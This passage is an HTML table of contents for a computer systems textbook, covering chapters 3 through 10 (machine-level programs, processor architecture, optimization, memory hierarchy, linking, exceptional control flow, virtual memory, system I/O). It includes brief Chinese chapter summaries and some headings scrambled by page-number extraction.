href="#3-7-4-Local-Storage-on-the-Stack" class="headerlink" title="3.7.4 Local Storage on the Stack"></a>3.7.4 Local Storage on the Stack</h3><h3 id="3-7-5-Local-Storage-in-Registers"><a href="#3-7-5-Local-Storage-in-Registers" class="headerlink" title="3.7.5 Local Storage in Registers"></a>3.7.5 Local Storage in Registers</h3><h3 id="3-7-6-Recursive-Procedures"><a href="#3-7-6-Recursive-Procedures" class="headerlink" title="3.7.6 Recursive Procedures"></a>3.7.6 Recursive Procedures</h3><h2 id="3-8-Array-Allocation-and-Access"><a href="#3-8-Array-Allocation-and-Access" class="headerlink" title="3.8 Array Allocation and Access"></a>3.8 Array Allocation and Access</h2><h3 id="3-8-1-Basic-Principles"><a href="#3-8-1-Basic-Principles" class="headerlink" title="3.8.1 Basic Principles"></a>3.8.1 Basic Principles</h3><h3 id="3-8-2-Pointer-Arithmetic"><a href="#3-8-2-Pointer-Arithmetic" class="headerlink" title="3.8.2 Pointer Arithmetic"></a>3.8.2 Pointer Arithmetic</h3><h3 id="3-8-3-Nested-Arrays"><a href="#3-8-3-Nested-Arrays" class="headerlink" title="3.8.3 Nested Arrays"></a>3.8.3 Nested Arrays</h3><h3 id="3-8-4-Fixed-Size-Arrays"><a href="#3-8-4-Fixed-Size-Arrays" class="headerlink" title="3.8.4 Fixed-Size Arrays"></a>3.8.4 Fixed-Size Arrays</h3><h3 id="3-8-5-Variable-Size-Arrays"><a href="#3-8-5-Variable-Size-Arrays" class="headerlink" title="3.8.5 Variable-Size Arrays"></a>3.8.5 Variable-Size Arrays</h3><h2 id="3-9-Heterogeneous-Data-Structures"><a href="#3-9-Heterogeneous-Data-Structures" class="headerlink" title="3.9 Heterogeneous Data Structures"></a>3.9 Heterogeneous Data Structures</h2><h3 id="3-9-1-Structures"><a href="#3-9-1-Structures" class="headerlink" title="3.9.1 Structures"></a>3.9.1 Structures</h3><h3 id="3-9-2-Unions-305"><a href="#3-9-2-Unions-305" class="headerlink" title="3.9.2 Unions 305"></a>3.9.2 Unions 305</h3><h3 id="3-9-3-Data-Alignment-309"><a href="#3-9-3-Data-Alignment-309" class="headerlink" title="3.9.3 Data Alignment 309"></a>3.9.3 Data Alignment 309</h3><h2 id="3-10-Combining-Control-and-Data-in-Machine-Level-Programs"><a href="#3-10-Combining-Control-and-Data-in-Machine-Level-Programs" class="headerlink" title="3.10 Combining Control and Data in Machine-Level Programs"></a>3.10 Combining Control and Data in Machine-Level Programs</h2><h3 id="3-10-1-Understanding-Pointers"><a href="#3-10-1-Understanding-Pointers" class="headerlink" title="3.10.1 Understanding Pointers"></a>3.10.1 Understanding Pointers</h3><h3 id="3-10-2-Life-in-the-Real-World-Using-the-gdb-Debugger"><a href="#3-10-2-Life-in-the-Real-World-Using-the-gdb-Debugger" class="headerlink" title="3.10.2 Life in the Real World: Using the gdb Debugger"></a>3.10.2 Life in the Real World: Using the gdb Debugger</h3><h3 id="3-10-3-Out-of-Bounds-Memory-References-and-Buffer-Overflow"><a href="#3-10-3-Out-of-Bounds-Memory-References-and-Buffer-Overflow" class="headerlink" title="3.10.3 Out-of-Bounds Memory References and Buffer Overflow"></a>3.10.3 Out-of-Bounds Memory References and Buffer Overflow</h3><h3 id="3-10-4-Thwarting-Buffer-Overflow-Attacks"><a href="#3-10-4-Thwarting-Buffer-Overflow-Attacks" class="headerlink" title="3.10.4 Thwarting Buffer Overflow Attacks"></a>3.10.4 Thwarting Buffer Overflow Attacks</h3><h3 id="3-10-5-Supporting-Variable-Size-Stack-Frames"><a href="#3-10-5-Supporting-Variable-Size-Stack-Frames" class="headerlink" title="3.10.5 Supporting Variable-Size Stack Frames"></a>3.10.5 Supporting Variable-Size Stack Frames</h3><h2 id="3-11-Floating-Point-Code"><a href="#3-11-Floating-Point-Code" class="headerlink" title="3.11 Floating-Point Code"></a>3.11 Floating-Point Code</h2><h3 id="3-11-1-Floating-Point-Movement-and-Conversion-Operations"><a href="#3-11-1-Floating-Point-Movement-and-Conversion-Operations" class="headerlink" title="3.11.1 Floating-Point Movement and Conversion Operations"></a>3.11.1 Floating-Point Movement and Conversion Operations</h3><h3 id="3-11-2-Floating-Point-Code-in-Procedures"><a href="#3-11-2-Floating-Point-Code-in-Procedures" class="headerlink" title="3.11.2 Floating-Point Code in Procedures"></a>3.11.2 Floating-Point Code in Procedures</h3><h3 id="3-11-3-Floating-Point-Arithmetic-Operations"><a href="#3-11-3-Floating-Point-Arithmetic-Operations" class="headerlink" title="3.11.3 Floating-Point Arithmetic Operations"></a>3.11.3 Floating-Point Arithmetic Operations</h3><h3 id="3-11-4-Defining-and-Using-Floating-Point-Constants"><a href="#3-11-4-Defining-and-Using-Floating-Point-Constants" class="headerlink" title="3.11.4 Defining and Using Floating-Point Constants"></a>3.11.4 Defining and Using Floating-Point Constants</h3><h3 id="3-11-5-Using-Bitwise-Operations-in-Floating-Point-Code"><a href="#3-11-5-Using-Bitwise-Operations-in-Floating-Point-Code" class="headerlink" title="3.11.5 Using Bitwise Operations in Floating-Point Code"></a>3.11.5 Using Bitwise Operations in Floating-Point Code</h3><h3 id="3-11-6-Floating-Point-Comparison-Operations"><a href="#3-11-6-Floating-Point-Comparison-Operations" class="headerlink" title="3.11.6 Floating-Point Comparison Operations"></a>3.11.6 Floating-Point Comparison Operations</h3><h3 id="3-11-7-Observations-about-Floating-Point-Code"><a href="#3-11-7-Observations-about-Floating-Point-Code" class="headerlink" title="3.11.7 Observations about Floating-Point Code"></a>3.11.7 Observations about Floating-Point Code</h3><h2 id="3-12-Summary"><a href="#3-12-Summary" class="headerlink" title="3.12 Summary"></a>3.12 Summary</h2><h1 id="Chapter-4-Processor-Architecture"><a href="#Chapter-4-Processor-Architecture" class="headerlink" title="Chapter 4: Processor Architecture"></a>Chapter 4: Processor Architecture</h1><blockquote>
<p>第 4 章:处理器体 系结构。这一章讲述基本的组合和时序逻辑元素，并展示这些元素如 何在数据通路中组合到一起，来执行 X86-64 指令集的一个称为“Y86-64”的简化子集。 我们从设计单时钟周期数据通路开始。这个设计概念上非常简单，但是运行速度不会太 快。然后我们引人流水线的思想，将处理一条指令所需要的不同步骤实现为独立的阶段。 这个设计中，在任何时刻，每个阶段都可以处理不同的指令。我们的五阶段处理器流水 线更加实用。本章中处理器设计的控制逻辑是用一种称为 HCL的简单硬件描述语言来描 述的。用 HCL 写的硬件设计能够编译和链接到本书提供的模拟器中，还可以根据这些设计生成 Verilog 描述，它适合合成到实际可以运行的硬件上去。</p>
</blockquote>
<h2 id="4-1-The-Y86-64-Instruction-Set-Architecture"><a href="#4-1-The-Y86-64-Instruction-Set-Architecture" class="headerlink" title="4.1 The Y86-64 Instruction Set Architecture"></a>4.1 The Y86-64 Instruction Set Architecture</h2><p>4.1.1 Programmer-Visible State<br>4.1.2 Y86-64 Instructions<br>4.1.3 Instruction Encoding<br>4.1.4 Y86-64 Exceptions<br>4.1.5 Y86-64 Programs<br>4.1.6 Some Y86-64 Instruction Details</p>
<h2 id="4-2-Logic-Design-and-the-Hardware-Control-Language-HCL"><a href="#4-2-Logic-Design-and-the-Hardware-Control-Language-HCL" class="headerlink" title="4.2 Logic Design and the Hardware Control Language HCL"></a>4.2 Logic Design and the Hardware Control Language HCL</h2><p>4.2.1 Logic Gates<br>4.2.2 Combinational Circuits and HCL Boolean Expressions<br>4.2.3 Word-Level Combinational Circuits and HCL<br>Integer Expressions<br>4.2.4 Set Membership<br>4.2.5 Memory and Clocking</p>
<h2 id="4-3-Sequential-Y86-64-Implementations"><a href="#4-3-Sequential-Y86-64-Implementations" class="headerlink" title="4.3 Sequential Y86-64 Implementations"></a>4.3 Sequential Y86-64 Implementations</h2><p>4.3.1 Organizing Processing into Stages</p>
<p>4.3.2 SEQ Hardware Structure<br>4.3.3 SEQ Timing<br>4.3.4 SEQ Stage Implementations</p>
<h2 id="4-4-General-Principles-of-Pipelining-448"><a href="#4-4-General-Principles-of-Pipelining-448" class="headerlink" title="4.4 General Principles of Pipelining 448"></a>4.4 General Principles of Pipelining 448</h2><p>4.4.1 Computational Pipelines<br>4.4.2 A Detailed Look at Pipeline Operation<br>4.4.3 Limitations of Pipelining<br>4.4.4 Pipelining a System with Feedback</p>
<h2 id="4-5-Pipelined-Y86-64-Implementations"><a href="#4-5-Pipelined-Y86-64-Implementations" class="headerlink" title="4.5 Pipelined Y86-64 Implementations"></a>4.5 Pipelined Y86-64 Implementations</h2><p>4.5.1 SEQ+: Rearranging the Computation Stages<br>4.5.2 Inserting Pipeline Registers<br>4.5.3 Rearranging and Relabeling Signals<br>4.5.4 Next PC Prediction<br>4.5.5 Pipeline Hazards<br>4.5.6 Exception Handling<br>4.5.7 PIPE Stage Implementations<br>4.5.8 Pipeline Control Logic<br>4.5.9 Performance Analysis<br>4.5.10 Unfinished Business</p>
<h2 id="4-6-Summary"><a href="#4-6-Summary" class="headerlink" title="4.6 Summary"></a>4.6 Summary</h2><p>4.6.1 Y86-64 Simulators</p>
<p>Bibliographic Notes</p>
<p>Homework Problems</p>
<p>Solutions to Practice Problems</p>
<h1 id="Chapter-5-Optimizing-Program-Performance"><a href="#Chapter-5-Optimizing-Program-Performance" class="headerlink" title="Chapter 5: Optimizing Program Performance"></a>Chapter 5: Optimizing Program Performance</h1><blockquote>
<p>第 5 章:优化程序性能。在这一章里，我们介绍了许多提高代码性能的技术，主要思想</p>
<p>就是让程序员通过使编译器能够生成更有效的机器代码来学习编写 C 代码。我们一开始 介绍的是减少程序需要做的工作的变换，这些是在任何机器上写任何程序时都应该遵循 的。然后讲的是增加生成的机器代码中指令级并行度的变换，因而提高了程序在现代</p>
<p>“超标量”处理器上的性能。为了解释这些变换行之有效的原理，我们介绍了一个简单 的操作模型，它描述了现代乱序处理器是如何工作的，然后给出了如何根据一个程序的 图形化表示中的关键路径来测量一个程序可能的性能。你会惊讶于对 C 代码做一些简单 的变换能给程序带来多大的速度提升。</p>
</blockquote>
<h2 id="5-1-Capabilities-and-Limitations-of-Optimizing-Compilers"><a href="#5-1-Capabilities-and-Limitations-of-Optimizing-Compilers" class="headerlink" title="5.1 Capabilities and Limitations of Optimizing Compilers"></a>5.1 Capabilities and Limitations of Optimizing Compilers</h2><h2 id="5-2-Expressing-Program-Performance"><a href="#5-2-Expressing-Program-Performance" class="headerlink" title="5.2 Expressing Program Performance"></a>5.2 Expressing Program Performance</h2><h2 id="5-3-Program-Example"><a href="#5-3-Program-Example" class="headerlink" title="5.3 Program Example"></a>5.3 Program Example</h2><h2 id="5-4-Eliminating-Loop-Inefficiencies"><a href="#5-4-Eliminating-Loop-Inefficiencies" class="headerlink" title="5.4 Eliminating Loop Inefficiencies"></a>5.4 Eliminating Loop Inefficiencies</h2><h2 id="5-5-Reducing-Procedure-Calls"><a href="#5-5-Reducing-Procedure-Calls" class="headerlink" title="5.5 Reducing Procedure Calls"></a>5.5 Reducing Procedure Calls</h2><h2 id="5-6-Eliminating-Unneeded-Memory-References"><a href="#5-6-Eliminating-Unneeded-Memory-References" class="headerlink" title="5.6 Eliminating Unneeded Memory References"></a>5.6 Eliminating Unneeded Memory References</h2><h2 id="5-7-Understanding-Modern-Processors"><a href="#5-7-Understanding-Modern-Processors" class="headerlink" title="5.7 Understanding Modern Processors"></a>5.7 Understanding Modern Processors</h2><p>5.7.1 Overall Operation<br>5.7.2 Functional Unit Performance<br>5.7.3 An Abstract Model of Processor Operation</p>
<h2 id="5-8-Loop-Unrolling"><a href="#5-8-Loop-Unrolling" class="headerlink" title="5.8 Loop Unrolling"></a>5.8 Loop Unrolling</h2><h2 id="5-9-Enhancing-Parallelism"><a href="#5-9-Enhancing-Parallelism" class="headerlink" title="5.9 Enhancing Parallelism"></a>5.9 Enhancing Parallelism</h2><p>5.9.1 Multiple Accumulators<br>5.9.2 Reassociation Transformation</p>
<h2 id="5-10-Summary-of-Results-for-Optimizing-Combining-Code"><a href="#5-10-Summary-of-Results-for-Optimizing-Combining-Code" class="headerlink" title="5.10 Summary of Results for Optimizing Combining Code"></a>5.10 Summary of Results for Optimizing Combining Code</h2><h2 id="5-11-Some-Limiting-Factors"><a href="#5-11-Some-Limiting-Factors" class="headerlink" title="5.11 Some Limiting Factors"></a>5.11 Some Limiting Factors</h2><p>5.11.1 Register Spilling<br>5.11.2 Branch Prediction and Misprediction Penalties</p>
<h2 id="5-12-Understanding-Memory-Performance"><a href="#5-12-Understanding-Memory-Performance" class="headerlink" title="5.12 Understanding Memory Performance"></a>5.12 Understanding Memory Performance</h2><p>5.12.1 Load Performance<br>5.12.2 Store Performance</p>
<h2 id="5-13-Life-in-the-Real-World-Performance-Improvement-Techniques"><a href="#5-13-Life-in-the-Real-World-Performance-Improvement-Techniques" class="headerlink" title="5.13 Life in the Real World: Performance Improvement Techniques"></a>5.13 Life in the Real World: Performance Improvement Techniques</h2><h2 id="5-14-Identifying-and-Eliminating-Performance-Bottlenecks"><a href="#5-14-Identifying-and-Eliminating-Performance-Bottlenecks" class="headerlink" title="5.14 Identifying and Eliminating Performance Bottlenecks"></a>5.14 Identifying and Eliminating Performance Bottlenecks</h2><p>5.14.1 Program Profiling<br>5.14.2 Using a Profiler to Guide Optimization</p>
<h2 id="5-15-Summary"><a href="#5-15-Summary" class="headerlink" title="5.15 Summary"></a>5.15 Summary</h2><h1 id="Chapter-6-The-Memory-Hierarchy"><a href="#Chapter-6-The-Memory-Hierarchy" class="headerlink" title="Chapter 6: The Memory Hierarchy"></a>Chapter 6: The Memory Hierarchy</h1><blockquote>
<p>第 6 章:存储器层次结构。对应用程序员来说，存储器系统是计算机系统中最直接可见 的部分之一。到目前为止，读者一直认同这样一个存储器系统概念模型，认为它是一个 有一致访问时间的线性数组。实际上，存储器系统是一个由不同容量、造价和访问时间 的存储设备组成的层次结构。我们讲述不同类型的随机存取存储器(RAM)和只读存储器</p>
<p>(ROM), 以及磁盘和固态硬盘 e的几何形状和组织构造。我们描述这些存储设备是如 何放置在层次结构中的，讲述访问局部性是如何使这种层次结构成为可能的。我们通 过一个独特的观点使这些理论具体化，那就是将存储器系统视为一个“存储器山”， 山脊是时间局部性，而斜坡是空间局部性。最后，我们向读者阐述如何通过改善程序 的时间局部性和空间局部性来提高应用程序的性能。</p>
</blockquote>
<h2 id="6-1-Storage-Technologies"><a href="#6-1-Storage-Technologies" class="headerlink" title="6.1 Storage Technologies"></a>6.1 Storage Technologies</h2><p>6.1.1 Random Access Memory<br>6.1.2 Disk Storage<br>6.1.3 Solid State Disks<br>6.1.4 Storage Technology Trends</p>
<h2 id="6-2-Locality"><a href="#6-2-Locality" class="headerlink" title="6.2 Locality"></a>6.2 Locality</h2><p>6.2.1 Locality of References to Program Data<br>6.2.2 Locality of Instruction Fetches<br>6.2.3 Summary of Locality</p>
<h2 id="6-3-The-Memory-Hierarchy"><a href="#6-3-The-Memory-Hierarchy" class="headerlink" title="6.3 The Memory Hierarchy"></a>6.3 The Memory Hierarchy</h2><p>6.3.1 Caching in the Memory Hierarchy<br>6.3.2 Summary of Memory Hierarchy Concepts</p>
<h2 id="6-4-Cache-Memories"><a href="#6-4-Cache-Memories" class="headerlink" title="6.4 Cache Memories"></a>6.4 Cache Memories</h2><p>6.4.1 Generic Cache Memory Organization<br>6.4.2 Direct-Mapped Caches<br>6.4.3 Set Associative Caches<br>6.4.4 Fully Associative Caches<br>6.4.5 Issues with Writes<br>6.4.6 Anatomy of a Real Cache Hierarchy<br>6.4.7 Performance Impact of Cache Parameters</p>
<h2 id="6-5-Writing-Cache-Friendly-Code"><a href="#6-5-Writing-Cache-Friendly-Code" class="headerlink" title="6.5 Writing Cache-Friendly Code"></a>6.5 Writing Cache-Friendly Code</h2><h2 id="6-6-Putting-It-Together-The-Impact-of-Caches-on-Program-Performance"><a href="#6-6-Putting-It-Together-The-Impact-of-Caches-on-Program-Performance" class="headerlink" title="6.6 Putting It Together: The Impact of Caches on Program Performance"></a>6.6 Putting It Together: The Impact of Caches on Program Performance</h2><p>6.6.1 The Memory Mountain<br>6.6.2 Rearranging Loops to Increase Spatial Locality<br>6.6.3 Exploiting Locality in Your Programs</p>
<h2 id="6-7-Summary"><a href="#6-7-Summary" class="headerlink" title="6.7 Summary"></a>6.7 Summary</h2><h2 id="Part-II-Running-Programs-on-a-System"><a href="#Part-II-Running-Programs-on-a-System" class="headerlink" title="Part II: Running Programs on a System"></a><em>Part II: Running Programs on a System</em></h2><h1 id="Chapter-7-Linking"><a href="#Chapter-7-Linking" class="headerlink" title="Chapter 7: Linking"></a>Chapter 7: Linking</h1><blockquote>
<p>第 7 章:链接。本章讲述静态和动态链接，包括的概念有可重定位的和可执行的目 标文件、符号解析、重定位、静态库、共享目标库、位置无关代码，以及库打桩。 大多数讲述系统的书中都不讲链接，我们要讲述它是出于以下原因。第一，程序员 遇到的最令人迷惑的问题中，有一些和链接时的小故障有关，尤其是对那些大型软 件包来说。第二，链接器生成的目标文件是与一些像加载、虚拟内存和内存映射这 样的概念相关的。</p>
</blockquote>
<h2 id="7-1-Compiler-Drivers"><a href="#7-1-Compiler-Drivers" class="headerlink" title="7.1 Compiler Drivers"></a>7.1 Compiler Drivers</h2><h2 id="7-2-Static-Linking"><a href="#7-2-Static-Linking" class="headerlink" title="7.2 Static Linking"></a>7.2 Static Linking</h2><h2 id="7-3-Object-Files"><a href="#7-3-Object-Files" class="headerlink" title="7.3 Object Files"></a>7.3 Object Files</h2><h2 id="7-4-Relocatable-Object-Files"><a href="#7-4-Relocatable-Object-Files" class="headerlink" title="7.4 Relocatable Object Files"></a>7.4 Relocatable Object Files</h2><h2 id="7-5-Symbols-and-Symbol-Tables"><a href="#7-5-Symbols-and-Symbol-Tables" class="headerlink" title="7.5 Symbols and Symbol Tables"></a>7.5 Symbols and Symbol Tables</h2><h2 id="7-6-Symbol-Resolution"><a href="#7-6-Symbol-Resolution" class="headerlink" title="7.6 Symbol Resolution"></a>7.6 Symbol Resolution</h2><p>7.6.1 How Linkers Resolve Duplicate Symbol Names<br>7.6.2 Linking with Static Libraries<br>7.6.3 How Linkers Use Static Libraries to Resolve References</p>
<h2 id="7-7-Relocation"><a href="#7-7-Relocation" class="headerlink" title="7.7 Relocation"></a>7.7 Relocation</h2><p>7.7.1 Relocation Entries<br>7.7.2 Relocating Symbol References</p>
<h2 id="7-8-Executable-Object-Files"><a href="#7-8-Executable-Object-Files" class="headerlink" title="7.8 Executable Object Files"></a>7.8 Executable Object Files</h2><h2 id="7-9-Loading-Executable-Object-Files"><a href="#7-9-Loading-Executable-Object-Files" class="headerlink" title="7.9 Loading Executable Object Files"></a>7.9 Loading Executable Object Files</h2><h2 id="7-10-Dynamic-Linking-with-Shared-Libraries"><a href="#7-10-Dynamic-Linking-with-Shared-Libraries" class="headerlink" title="7.10 Dynamic Linking with Shared Libraries"></a>7.10 Dynamic Linking with Shared Libraries</h2><h2 id="7-11-Loading-and-Linking-Shared-Libraries-from-Applications"><a href="#7-11-Loading-and-Linking-Shared-Libraries-from-Applications" class="headerlink" title="7.11 Loading and Linking Shared Libraries from Applications"></a>7.11 Loading and Linking Shared Libraries from Applications</h2><h2 id="7-12-Position-Independent-Code-PIC"><a href="#7-12-Position-Independent-Code-PIC" class="headerlink" title="7.12 Position-Independent Code (PIC)"></a>7.12 Position-Independent Code (PIC)</h2><h2 id="7-13-Library-Interpositioning"><a href="#7-13-Library-Interpositioning" class="headerlink" title="7.13 Library Interpositioning"></a>7.13 Library Interpositioning</h2><p>7.13.1 Compile-Time Interpositioning<br>7.13.2 Link-Time Interpositioning<br>7.13.3 Run-Time Interpositioning</p>
<h2 id="7-14-Tools-for-Manipulating-Object-Files"><a href="#7-14-Tools-for-Manipulating-Object-Files" class="headerlink" title="7.14 Tools for Manipulating Object Files"></a>7.14 Tools for Manipulating Object Files</h2><h2 id="7-15-Summary"><a href="#7-15-Summary" class="headerlink" title="7.15 Summary"></a>7.15 Summary</h2><h1 id="Chapter-8-Exceptional-Control-Flow"><a href="#Chapter-8-Exceptional-Control-Flow" class="headerlink" title="Chapter 8: Exceptional Control Flow"></a>Chapter 8: Exceptional Control Flow</h1><blockquote>
<p>第 8 章:异常控制流。在本书的这个部分，我们通过介绍异常控制流(即除正常分 支和过程调用以外的控制流的变化)的一般概念，打破单一程序的模型。我们给出 存在于系统所有层次的异常控制流的例子，从底层的硬件异常和中断，到并发进程 的上下文切换，到由于接收 Linux 信号引起的控制流突变，到 C语言中破坏栈原则 的非本地跳转。</p>
<p>在这一章，我们介绍进程的基本概念，进程是对一个正在执行的程序的一种抽 象。读者会学习进程是如何工作的，以及如何在应用程序中创建和操纵进程。我们会展示应用程序员如何通过 Linux 系统调用来使用多个进程。学完本章之后，读者 就能够编写带作业控制的 Linux shell 了。同时，这里也会向读者初步展示程序的并 发执行会引起不确定的行为。</p>
</blockquote>
<h2 id="8-1-Exceptions"><a href="#8-1-Exceptions" class="headerlink" title="8.1 Exceptions"></a>8.1 Exceptions</h2><p>8.1.1 Exception Handling<br>8.1.2 Classes of Exceptions<br>8.1.3 Exceptions in Linux/x86-64 Systems</p>
<h2 id="8-2-Processes"><a href="#8-2-Processes" class="headerlink" title="8.2 Processes"></a>8.2 Processes</h2><p>8.2.1 Logical Control Flow<br>8.2.2 Concurrent Flows 769<br>8.2.3 Private Address Space 770<br>8.2.4 User and Kernel Modes 770<br>8.2.5 Context Switches 772</p>
<h2 id="8-3-System-Call-Error-Handling-773"><a href="#8-3-System-Call-Error-Handling-773" class="headerlink" title="8.3 System Call Error Handling 773"></a>8.3 System Call Error Handling 773</h2><h2 id="8-4-Process-Control-774"><a href="#8-4-Process-Control-774" class="headerlink" title="8.4 Process Control 774"></a>8.4 Process Control 774</h2><p>8.4.1 Obtaining Process IDs 775<br>8.4.2 Creating and Terminating Processes 775<br>8.4.3 Reaping Child Processes 779<br>8.4.4 Putting Processes to Sleep 785<br>8.4.5 Loading and Running Programs 786<br>8.4.6 Using fork and execve to Run Programs 789</p>
<h2 id="8-5-Signals"><a href="#8-5-Signals" class="headerlink" title="8.5 Signals"></a>8.5 Signals</h2><p>8.5.1 Signal Terminology 794<br>8.5.2 Sending Signals 795<br>8.5.3 Receiving Signals 798<br>8.5.4 Blocking and Unblocking Signals 800<br>8.5.5 Writing Signal Handlers 802<br>8.5.6 Synchronizing Flows to Avoid Nasty Concurrency Bugs 812<br>8.5.7 Explicitly Waiting for Signals 814</p>
<h2 id="8-6-Nonlocal-Jumps-817"><a href="#8-6-Nonlocal-Jumps-817" class="headerlink" title="8.6 Nonlocal Jumps 817"></a>8.6 Nonlocal Jumps 817</h2><h2 id="8-7-Tools-for-Manipulating-Processes-822"><a href="#8-7-Tools-for-Manipulating-Processes-822" class="headerlink" title="8.7 Tools for Manipulating Processes 822"></a>8.7 Tools for Manipulating Processes 822</h2><h2 id="8-8-Summary-823"><a href="#8-8-Summary-823" class="headerlink" title="8.8 Summary 823"></a>8.8 Summary 823</h2><p>Bibliographic Notes 823 Homework Problems 824 Solutions to Practice Problems 831</p>
<h1 id="Chapter-9-Virtual-Memory-837"><a href="#Chapter-9-Virtual-Memory-837" class="headerlink" title="Chapter 9: Virtual Memory 837"></a>Chapter 9: Virtual Memory 837</h1><blockquote>
<p>第 9 章:虚拟内存。我们讲述虚拟内存系统是希望读者对它是如何工作的以及它的特 性有所了解。我们想让读者了解为什么不同的并发进程各自都有一个完全相同的地址 范围，能共享某些页，而又独占另外一些页。我们还讲了一些管理和操纵虚拟内存的 问题。特别地，我们讨论了存储分配操作，就像标准库的 malloc 和 free 操作。阐述 这些内容是出于下面几个目的。它加强了这样一个概念，那就是虚拟内存空间只是一 个字节数组，程序可以把它划分成不同的存储单元。它可以帮助读者理解当程序包含 存储泄漏和非法指针引用等内存引用错误时的后果。最后，许多应用程序员编写自己 的优化了的存储分配操作来满足应用程序的需要和特性。这一章比其他任何一章都更 能展现将计算机系统中的硬件和软件结合起来阐述的优点。而传统的计算机体系结构 和操作系统书籍都只讲述虚拟内存的某一方面。</p>
</blockquote>
<h2 id="9-1-Physical-and-Virtual-Addressing-839"><a href="#9-1-Physical-and-Virtual-Addressing-839" class="headerlink" title="9.1 Physical and Virtual Addressing 839"></a>9.1 Physical and Virtual Addressing 839</h2><h2 id="9-2-Address-Spaces-840"><a href="#9-2-Address-Spaces-840" class="headerlink" title="9.2 Address Spaces 840"></a>9.2 Address Spaces 840</h2><h2 id="9-3-VM-as-a-Tool-for-Caching-841"><a href="#9-3-VM-as-a-Tool-for-Caching-841" class="headerlink" title="9.3 VM as a Tool for Caching 841"></a>9.3 VM as a Tool for Caching 841</h2><p>9.3.1 DRAM Cache Organization 842<br>9.3.2 Page Tables 842<br>9.3.3 Page Hits 844<br>9.3.4 Page Faults 844<br>9.3.5 Allocating Pages 846<br>9.3.6 Locality to the Rescue Again 846</p>
<h2 id="9-4-VM-as-a-Tool-for-Memory-Management-847"><a href="#9-4-VM-as-a-Tool-for-Memory-Management-847" class="headerlink" title="9.4 VM as a Tool for Memory Management 847"></a>9.4 VM as a Tool for Memory Management 847</h2><h2 id="9-5-VM-as-a-Tool-for-Memory-Protection-848"><a href="#9-5-VM-as-a-Tool-for-Memory-Protection-848" class="headerlink" title="9.5 VM as a Tool for Memory Protection 848"></a>9.5 VM as a Tool for Memory Protection 848</h2><h2 id="9-6-Address-Translation-849"><a href="#9-6-Address-Translation-849" class="headerlink" title="9.6 Address Translation 849"></a>9.6 Address Translation 849</h2><p>9.6.1 9.6.2 9.6.3 9.6.4</p>
<h2 id="9-7-Case-9-7-1-9-7-2"><a href="#9-7-Case-9-7-1-9-7-2" class="headerlink" title="9.7 Case 9.7.1 9.7.2"></a>9.7 Case 9.7.1 9.7.2</h2><p>Integrating Caches and VM 853<br>Speeding Up Address Translation with a TLB 853 Multi-Level Page Tables 855<br>Putting It Together: End-to-End Address Translation 857<br>Study: The Intel Core i7/Linux Memory System 861 Core i7 Address Translation 862<br>Linux Virtual Memory System 864</p>
<h2 id="9-8-Memory-Mapping-869"><a href="#9-8-Memory-Mapping-869" class="headerlink" title="9.8 Memory Mapping 869"></a>9.8 Memory Mapping 869</h2><p>9.8.1 Shared Objects Revisited 869<br>9.8.2 The fork Function Revisited 872<br>9.8.3 The execve Function Revisited 872<br>9.8.4 User-Level Memory Mapping with the mmap Function 873</p>
<h2 id="9-9-Dynamic-Memory-Allocation-875"><a href="#9-9-Dynamic-Memory-Allocation-875" class="headerlink" title="9.9 Dynamic Memory Allocation 875"></a>9.9 Dynamic Memory Allocation 875</h2><p>9.9.1 The malloc and free Functions 876<br>9.9.2 Why Dynamic Memory Allocation? 879<br>9.9.3 Allocator Requirements and Goals 880<br>9.9.4 Fragmentation 882<br>9.9.5 Implementation Issues 882<br>9.9.6 Implicit Free Lists 883<br>9.9.7 Placing Allocated Blocks 885<br>9.9.8 Splitting Free Blocks 885<br>9.9.9 Getting Additional Heap Memory 886<br>9.9.10 Coalescing Free Blocks 886<br>9.9.11 Coalescing with Boundary Tags 887<br>9.9.12 Putting It Together: Implementing a Simple Allocator 890<br>9.9.13 Explicit Free Lists 898<br>9.9.14 Segregated Free Lists 899</p>
<h2 id="9-10-Garbage-Collection-901"><a href="#9-10-Garbage-Collection-901" class="headerlink" title="9.10 Garbage Collection 901"></a>9.10 Garbage Collection 901</h2><p>9.10.1 Garbage Collector Basics 902<br>9.10.2 Mark&amp;Sweep Garbage Collectors 903<br>9.10.3 Conservative Mark&amp;Sweep for C Programs 905</p>
<h2 id="9-11-Common-Memory-Related-Bugs-in-C-Programs-906"><a href="#9-11-Common-Memory-Related-Bugs-in-C-Programs-906" class="headerlink" title="9.11 Common Memory-Related Bugs in C Programs 906"></a>9.11 Common Memory-Related Bugs in C Programs 906</h2><p>9.11.1 Dereferencing Bad Pointers 906<br>9.11.2 Reading Uninitialized Memory 907<br>9.11.3 Allowing Stack Buffer Overflows 907<br>9.11.4 Assuming That Pointers and the Objects They Point to Are the Same Size 908<br>9.11.5 Making Off-by-One Errors 908<br>9.11.6 Referencing a Pointer Instead of the Object It Points To 909<br>9.11.7 Misunderstanding Pointer Arithmetic 909<br>9.11.8 Referencing Nonexistent Variables 910<br>9.11.9 Referencing Data in Free Heap Blocks 910<br>9.11.10 Introducing Memory Leaks 911</p>
<h2 id="9-12-Summary-911-Bibliographic-Notes-912"><a href="#9-12-Summary-911-Bibliographic-Notes-912" class="headerlink" title="9.12 Summary 911 Bibliographic Notes 912"></a>9.12 Summary 911 Bibliographic Notes 912</h2><p>Homework Problems 912 Solutions to Practice Problems 916<br>Part III Interaction and Communication between Programs</p>
<h1 id="Chapter-10-System-Level-I-O"><a href="#Chapter-10-System-Level-I-O" class="headerlink" title="Chapter 10: System-Level I/O"></a>Chapter 10: System-Level I/O</h1><blockquote>
<p>第 10 章:系统级 I/O。我们讲述 Unix I/O 的基本概念，例如文件和描述符。我们 描述如何共享文件，I/O 重定向是如何工作的，还有如何访问文件的元数据。我们 还开发了一个健壮的带缓冲区的 1/�包，可以正确处理一种称为 short counts 的奇 特行为，也就是库函数只读取一部分的输人数据。我们阐述 C 的标准 I/O 库，以及 它与 Linux I/O 的关系，重点谈到标准 I/O 的局限性，这些局限性使之不适合网络 编程。总的来说，本章的主题是后面两章—— 网络和并发编程的基础。</p>
</blockquote>
